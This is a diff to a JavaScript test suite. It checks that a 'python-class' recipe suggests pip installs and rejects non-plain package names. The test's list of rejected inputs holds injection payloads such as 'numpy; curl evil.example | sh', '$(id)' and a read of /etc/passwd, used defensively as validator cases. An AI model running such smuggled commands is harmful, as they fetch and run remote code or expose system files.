@@ -473,13 +473,15 @@ describe('the shipped recipes', () => {
 
   it('python-class suggests packages instead of installing them, and only plain names', async () => {
     const ok = await runRecipe('python-class', { RUN_PIP: 'numpy pandas matplotlib' });
-    expect(ok.calls).toEqual(['toolchain install python']);
-    expect(ok.r.output).toContain('python3 -m pip install --user --break-system-packages numpy pandas matplotlib');
+    // (nothing is installed: python3 is the built-in Python, which pip installs numpy for)
+    expect(ok.calls).toEqual([]);
+    expect(ok.r.output).toContain('To install them: pip install numpy pandas matplotlib');
+    expect(ok.r.output).toContain('For turtle or tkinter: toolchain install python');
     for (const pip of ['--index-url=evil numpy', 'numpy -r /etc/passwd', 'numpy; curl evil.example | sh', 'numpy && id', '$(id)', 'git+https://evil.example/x', 'numpy\\ x', '`id`']) {
       const t = await runRecipe('python-class', { RUN_PIP: pip });
       expect(t.r.output, pip).toContain('not plain package names');
       expect(t.r.output, pip).not.toContain('To install them');
-      expect(t.calls, pip).toEqual(['toolchain install python']);
+      expect(t.calls, pip).toEqual([]);
     }
   });
 
